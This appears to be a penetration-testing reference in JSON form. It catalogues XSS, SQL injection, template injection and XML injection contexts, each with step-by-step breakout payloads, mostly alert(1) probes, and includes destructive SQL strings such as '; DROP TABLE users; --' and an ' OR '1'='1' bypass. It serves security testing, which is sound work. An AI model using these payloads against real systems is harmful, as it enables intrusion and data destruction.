@@ -1,0 +1,618 @@
+{
+  "injection_contexts": {
+    "html": {
+      "html_body_content": {
+        "context_patterns": [
+          "<div>USER_INPUT</div>",
+          "<p>USER_INPUT</p>",
+          "<span>USER_INPUT</span>"
+        ],
+        "structural_requirements": {
+          "escape": "Not needed (already in HTML context)",
+          "structure": "Valid HTML tags or text",
+          "payload": "HTML tags with event handlers or script tags",
+          "cleanup": "Close any opened tags"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "<img",
+          "step_3": "<img src=x",
+          "step_4": "<img src=x onerror=",
+          "step_5": "<img src=x onerror=alert(1)",
+          "step_6": "<img src=x onerror=alert(1)>"
+        }
+      },
+      "html_attribute_values": {
+        "context_patterns": [
+          "<input value=\"USER_INPUT\">",
+          "<img src=\"USER_INPUT\">",
+          "<a href=\"USER_INPUT\">"
+        ],
+        "structural_requirements": {
+          "escape": "\" or ' (close current attribute)",
+          "structure": "Space + new attribute name",
+          "payload": "Event handler with JavaScript",
+          "cleanup": "\" or ' (close your attribute)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\" onmouseover=",
+          "step_4": "\" onmouseover=\"alert(1)",
+          "step_5": "\" onmouseover=\"alert(1)\"",
+          "step_6": "\" onmouseover=\"alert(1)\" x=\""
+        }
+      },
+      "html_attribute_names": {
+        "context_patterns": [
+          "<div USER_INPUT=\"value\">",
+          "<img USER_INPUT=\"test\">"
+        ],
+        "structural_requirements": {
+          "escape": "Space (separate from previous attribute)",
+          "structure": "Valid attribute name",
+          "payload": "Event handler attribute",
+          "cleanup": "=\" + dummy value"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "onmouseover",
+          "step_3": "onmouseover=",
+          "step_4": "onmouseover=\"alert(1)",
+          "step_5": "onmouseover=\"alert(1)\""
+        }
+      },
+      "html_comments": {
+        "context_patterns": [
+          "<!-- USER_INPUT -->",
+          "<!-- Comment: USER_INPUT -->"
+        ],
+        "structural_requirements": {
+          "escape": "--> (close comment)",
+          "structure": "Valid HTML after comment",
+          "payload": "Script tags or event handlers",
+          "cleanup": "<!-- (open new comment)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "-->",
+          "step_3": "--><script>",
+          "step_4": "--><script>alert(1)",
+          "step_5": "--><script>alert(1)</script>",
+          "step_6": "--><script>alert(1)</script><!--"
+        }
+      }
+    },
+    "javascript": {
+      "javascript_string_literals": {
+        "context_patterns": [
+          "<script>var data = \"USER_INPUT\";</script>",
+          "<script>var msg = 'USER_INPUT';</script>"
+        ],
+        "structural_requirements": {
+          "escape": "\" or ' (close string)",
+          "structure": "; (end statement)",
+          "payload": "Valid JavaScript",
+          "cleanup": ";// or /**/ (comment out rest)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\";",
+          "step_4": "\";alert(1)",
+          "step_5": "\";alert(1);",
+          "step_6": "\";alert(1);//"
+        }
+      },
+      "javascript_function_parameters": {
+        "context_patterns": [
+          "<script>someFunction(\"USER_INPUT\");</script>",
+          "<script>callback('USER_INPUT');</script>"
+        ],
+        "structural_requirements": {
+          "escape": "\" (close parameter)",
+          "structure": ") (close function call)",
+          "payload": "; + JavaScript",
+          "cleanup": ";// (comment)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\")",
+          "step_4": "\");",
+          "step_5": "\");alert(1)",
+          "step_6": "\");alert(1);//"
+        }
+      },
+      "javascript_object_properties": {
+        "context_patterns": [
+          "<script>var obj = {prop: \"USER_INPUT\"};</script>",
+          "<script>config = {data: 'USER_INPUT'};</script>"
+        ],
+        "structural_requirements": {
+          "escape": "\" (close property value)",
+          "structure": "} (close object)",
+          "payload": "; + JavaScript",
+          "cleanup": ";// (comment)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\"}",
+          "step_4": "\"};",
+          "step_5": "\"};alert(1)",
+          "step_6": "\"};alert(1);//"
+        }
+      },
+      "javascript_comments": {
+        "context_patterns": [
+          "<script>// USER_INPUT\nvar x = 1;</script>",
+          "<script>/* USER_INPUT */ var y = 2;</script>"
+        ],
+        "structural_requirements": {
+          "escape": "\\n or \\r (newline) or */ (close comment)",
+          "structure": "Valid JavaScript line",
+          "payload": "JavaScript code",
+          "cleanup": "// (new comment)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\\n",
+          "step_3": "\\nalert(1)",
+          "step_4": "\\nalert(1);//"
+        }
+      }
+    },
+    "json": {
+      "json_string_values": {
+        "context_patterns": [
+          "<script>var config = {\"name\": \"USER_INPUT\"};</script>",
+          "var data = {\"message\": \"USER_INPUT\", \"type\": \"info\"};"
+        ],
+        "structural_requirements": {
+          "escape": "\" (close string value)",
+          "structure": ", (property separator)",
+          "payload": "\"prop\":\"value\" (new property)",
+          "cleanup": "};// (close object + comment)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\",",
+          "step_4": "\",\"newprop\":",
+          "step_5": "\",\"newprop\":\"value\"",
+          "step_6": "\",\"newprop\":\"value\"}",
+          "step_7": "\",\"newprop\":\"value\"};//"
+        }
+      },
+      "json_object_properties": {
+        "context_patterns": [
+          "<script>var config = {USER_INPUT: \"value\"};</script>",
+          "var obj = {USER_INPUT: 123};"
+        ],
+        "structural_requirements": {
+          "escape": "Not needed (already property name)",
+          "structure": ": + property value",
+          "payload": "Valid JSON value or break structure",
+          "cleanup": ", or } depending on approach"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"test\"",
+          "step_3": "\"test\":",
+          "step_4": "\"test\":\"value\"",
+          "step_5": "\"test\":\"value\",\"xss\":\"alert(1)\""
+        }
+      },
+      "json_array_elements": {
+        "context_patterns": [
+          "<script>var arr = [\"item1\", \"USER_INPUT\", \"item3\"];</script>",
+          "var list = [1, \"USER_INPUT\", true];"
+        ],
+        "structural_requirements": {
+          "escape": "\" (close string element)",
+          "structure": "] (close array)",
+          "payload": "; + JavaScript",
+          "cleanup": ";// (comment)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\"]",
+          "step_4": "\"];",
+          "step_5": "\"];alert(1)",
+          "step_6": "\"];alert(1);//"
+        }
+      },
+      "jsonp_callbacks": {
+        "context_patterns": [
+          "<script>callback({\"data\": \"USER_INPUT\"});</script>",
+          "jsonp_response({\"result\": \"USER_INPUT\"});"
+        ],
+        "structural_requirements": {
+          "escape": "\" (close string)",
+          "structure": "}) (close callback)",
+          "payload": "; + JavaScript",
+          "cleanup": ";// (comment)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\"});",
+          "step_4": "\"});alert(1)",
+          "step_5": "\"});alert(1);//"
+        }
+      }
+    },
+    "css": {
+      "css_property_values": {
+        "context_patterns": [
+          "<div style=\"color: USER_INPUT\">",
+          "<span style=\"background: USER_INPUT;\">"
+        ],
+        "structural_requirements": {
+          "escape": "Not always needed",
+          "structure": "; (end property)",
+          "payload": "New CSS property or CSS function",
+          "cleanup": "; (end your property)"
+        },
+        "progressive_testing": {
+          "step_1": "red",
+          "step_2": "red;",
+          "step_3": "red;background:",
+          "step_4": "red;background:url(javascript:alert(1))",
+          "step_5": "red;background:url(javascript:alert(1));"
+        }
+      },
+      "css_style_blocks": {
+        "context_patterns": [
+          "<style>.class { color: USER_INPUT; }</style>",
+          "<style>body { font-size: USER_INPUT; }</style>"
+        ],
+        "structural_requirements": {
+          "escape": "Not needed initially",
+          "structure": "} (close current rule)",
+          "payload": "New CSS rule",
+          "cleanup": "Close any opened rules"
+        },
+        "progressive_testing": {
+          "step_1": "red",
+          "step_2": "red;}",
+          "step_3": "red;}body{",
+          "step_4": "red;}body{background:url(javascript:alert(1))",
+          "step_5": "red;}body{background:url(javascript:alert(1))}"
+        }
+      },
+      "css_attribute_selectors": {
+        "context_patterns": [
+          "<style>input[value=\"USER_INPUT\"] { }</style>",
+          "<style>div[data-USER_INPUT] { }</style>"
+        ],
+        "structural_requirements": {
+          "escape": "\" (close attribute value)",
+          "structure": "] (close selector)",
+          "payload": "New CSS rule or selector",
+          "cleanup": "Close rule block"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\"]",
+          "step_4": "\"] { background:url(javascript:alert(1))",
+          "step_5": "\"] { background:url(javascript:alert(1)) }"
+        }
+      }
+    },
+    "url_protocol": {
+      "href_attributes": {
+        "context_patterns": [
+          "<a href=\"USER_INPUT\">",
+          "<area href=\"USER_INPUT\">"
+        ],
+        "structural_requirements": {
+          "escape": "Not needed (URL context)",
+          "structure": "Valid URL scheme",
+          "payload": "javascript: protocol",
+          "cleanup": "Not typically needed"
+        },
+        "progressive_testing": {
+          "step_1": "http://test.com",
+          "step_2": "javascript:",
+          "step_3": "javascript:alert(1)",
+          "step_4": "javascript:alert(1);//"
+        }
+      },
+      "src_attributes": {
+        "context_patterns": [
+          "<img src=\"USER_INPUT\">",
+          "<script src=\"USER_INPUT\">",
+          "<iframe src=\"USER_INPUT\">"
+        ],
+        "structural_requirements": {
+          "escape": "\" (if breaking out of attribute)",
+          "structure": "Space + new attribute",
+          "payload": "Event handler",
+          "cleanup": "\" (close attribute)"
+        },
+        "progressive_testing": {
+          "step_1": "http://test.com/image.jpg",
+          "step_2": "\"",
+          "step_3": "\" onerror=\"",
+          "step_4": "\" onerror=\"alert(1)",
+          "step_5": "\" onerror=\"alert(1)\""
+        }
+      },
+      "action_attributes": {
+        "context_patterns": [
+          "<form action=\"USER_INPUT\">",
+          "<form method=\"post\" action=\"USER_INPUT\">"
+        ],
+        "structural_requirements": {
+          "escape": "\" (close attribute)",
+          "structure": "Space + new attribute or close tag",
+          "payload": "javascript: URL or event handler",
+          "cleanup": "\" (close attribute)"
+        },
+        "progressive_testing": {
+          "step_1": "/submit",
+          "step_2": "javascript:alert(1)",
+          "step_3": "\" onsubmit=\"alert(1)",
+          "step_4": "\" onsubmit=\"alert(1)\""
+        }
+      }
+    },
+    "sql": {
+      "sql_string_literals": {
+        "context_patterns": [
+          "SELECT * FROM users WHERE name = 'USER_INPUT'",
+          "INSERT INTO table VALUES ('USER_INPUT')"
+        ],
+        "structural_requirements": {
+          "escape": "' (close string)",
+          "structure": "; or SQL operator",
+          "payload": "SQL injection payload",
+          "cleanup": "-- or /**/ (comment)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "'",
+          "step_3": "';",
+          "step_4": "'; DROP TABLE users;",
+          "step_5": "'; DROP TABLE users; --"
+        }
+      },
+      "sql_numeric_contexts": {
+        "context_patterns": [
+          "SELECT * FROM users WHERE id = USER_INPUT",
+          "UPDATE table SET value = USER_INPUT"
+        ],
+        "structural_requirements": {
+          "escape": "Not needed (numeric context)",
+          "structure": "SQL operator or ;",
+          "payload": "SQL injection",
+          "cleanup": "-- (comment)"
+        },
+        "progressive_testing": {
+          "step_1": "123",
+          "step_2": "123;",
+          "step_3": "123; DROP TABLE users;",
+          "step_4": "123; DROP TABLE users; --"
+        }
+      },
+      "sql_like_patterns": {
+        "context_patterns": [
+          "SELECT * FROM users WHERE name LIKE '%USER_INPUT%'",
+          "WHERE column LIKE 'USER_INPUT%'"
+        ],
+        "structural_requirements": {
+          "escape": "' (close string)",
+          "structure": "SQL operator",
+          "payload": "SQL injection with wildcards",
+          "cleanup": "-- (comment)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "'",
+          "step_3": "' OR '1'='1",
+          "step_4": "' OR '1'='1' --"
+        }
+      }
+    },
+    "template_engines": {
+      "server_side_templates": {
+        "context_patterns": [
+          "Hello {{USER_INPUT}}!",
+          "{% if USER_INPUT %}content{% endif %}",
+          "${USER_INPUT}"
+        ],
+        "structural_requirements": {
+          "escape": "}} or %} (close template expression)",
+          "structure": "{{ or {% (open new expression)",
+          "payload": "Template injection payload",
+          "cleanup": "}} or %} (close expression)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "}}",
+          "step_3": "}}{{",
+          "step_4": "}}{{7*7}}",
+          "step_5": "}}{{7*7}}{{"
+        }
+      },
+      "client_side_templates": {
+        "context_patterns": [
+          "<div>{{USER_INPUT}}</div>",
+          "<span ng-bind=\"USER_INPUT\"></span>",
+          "{{ USER_INPUT | filter }}"
+        ],
+        "structural_requirements": {
+          "escape": "}} (close expression)",
+          "structure": "Valid HTML or new template expression",
+          "payload": "Template injection or XSS",
+          "cleanup": "Depends on template engine"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "}}",
+          "step_3": "}}<script>",
+          "step_4": "}}<script>alert(1)",
+          "step_5": "}}<script>alert(1)</script>{{"
+        }
+      },
+      "template_attributes": {
+        "context_patterns": [
+          "<div class=\"{{USER_INPUT}}\">",
+          "<input value=\"{{USER_INPUT}}\">"
+        ],
+        "structural_requirements": {
+          "escape": "}} (close template)",
+          "structure": "\" (close attribute)",
+          "payload": "Event handler or new attribute",
+          "cleanup": "{{ (start new template)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "}}",
+          "step_3": "}}\" onmouseover=\"alert(1)",
+          "step_4": "}}\" onmouseover=\"alert(1)\" class=\"{{"
+        }
+      }
+    },
+    "xml_soap": {
+      "xml_cdata": {
+        "context_patterns": [
+          "<data><![CDATA[USER_INPUT]]></data>",
+          "<description><![CDATA[USER_INPUT]]></description>"
+        ],
+        "structural_requirements": {
+          "escape": "]]> (close CDATA)",
+          "structure": "Valid XML",
+          "payload": "XML injection or XXE",
+          "cleanup": "<![CDATA[ (new CDATA)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "]]>",
+          "step_3": "]]><script>alert(1)</script><![CDATA[",
+          "step_4": "]]></data><script>alert(1)</script><data><![CDATA["
+        }
+      },
+      "xml_attributes": {
+        "context_patterns": [
+          "<element attr=\"USER_INPUT\">",
+          "<node id=\"USER_INPUT\" value=\"test\">"
+        ],
+        "structural_requirements": {
+          "escape": "\" (close attribute)",
+          "structure": "Space + new attribute",
+          "payload": "New attribute or close tag",
+          "cleanup": "\" (close attribute)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\" newattr=\"",
+          "step_4": "\" newattr=\"value",
+          "step_5": "\" newattr=\"value\""
+        }
+      },
+      "xml_text_content": {
+        "context_patterns": [
+          "<message>USER_INPUT</message>",
+          "<description>USER_INPUT</description>"
+        ],
+        "structural_requirements": {
+          "escape": "Not needed (text context)",
+          "structure": "Valid XML text or tags",
+          "payload": "XML tags or entities",
+          "cleanup": "Close any opened tags"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "<script>",
+          "step_3": "<script>alert(1)",
+          "step_4": "<script>alert(1)</script>"
+        }
+      }
+    },
+    "framework_specific": {
+      "react_jsx": {
+        "context_patterns": [
+          "const data = \"USER_INPUT\"; return <div>{data}</div>;",
+          "<div dangerouslySetInnerHTML={{__html: \"USER_INPUT\"}} />"
+        ],
+        "structural_requirements": {
+          "escape": "\" (close string)",
+          "structure": "; (end statement)",
+          "payload": "JavaScript or JSX",
+          "cleanup": ";// (comment)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\";",
+          "step_4": "\";alert(1);",
+          "step_5": "\";alert(1);//"
+        }
+      },
+      "angular_templates": {
+        "context_patterns": [
+          "<div>{{USER_INPUT}}</div>",
+          "<span [innerHTML]=\"USER_INPUT\"></span>"
+        ],
+        "structural_requirements": {
+          "escape": "}} (close expression)",
+          "structure": "Valid Angular expression",
+          "payload": "Angular expression injection",
+          "cleanup": "{{ (start new expression)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "}}",
+          "step_3": "}}{{constructor.constructor('alert(1)')()",
+          "step_4": "}}{{constructor.constructor('alert(1)')()}}{{"
+        }
+      },
+      "vue_templates": {
+        "context_patterns": [
+          "<div>{{USER_INPUT}}</div>",
+          "<span v-html=\"USER_INPUT\"></span>"
+        ],
+        "structural_requirements": {
+          "escape": "}} (close mustache)",
+          "structure": "Valid Vue expression",
+          "payload": "Vue expression or HTML",
+          "cleanup": "{{ (start new expression)"
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "}}",
+          "step_3": "}}<script>alert(1)</script>{{",
+          "step_4": "}}<img src=x onerror=alert(1)>{{"
+        }
+      }
+    }
+  },
+  "testing_methodology": {
+    "context_identification": [
+      "Inject unique markers (TESTXSS123) to trace data flow",
+      "View page source to see exact injection context",
+      "Use browser developer tools to inspect DOM",
+      "Test with different browsers for parsing variations"
+    ],
+    "progressive_testing_principles": [
+      "Always test structural components separately first",
+      "Verify each escape mechanism works before adding payload",
+      "Use progressive complexity in testing",
+      "Understand the parsing rules of each context",
+      "Test cleanup mechanisms to prevent syntax errors",
+      "Consider encoding variations for each context"
+    ],
+    "failure_analysis": [
+      "Syntax/Structure failure - injection doesn't escape context",
+      "Payload failure - malicious code doesn't execute",
+      "Execution context failure - payload executes in wrong context",
+      "Cleanup failure - syntax errors break page functionality"
+    ]
+  }
+}
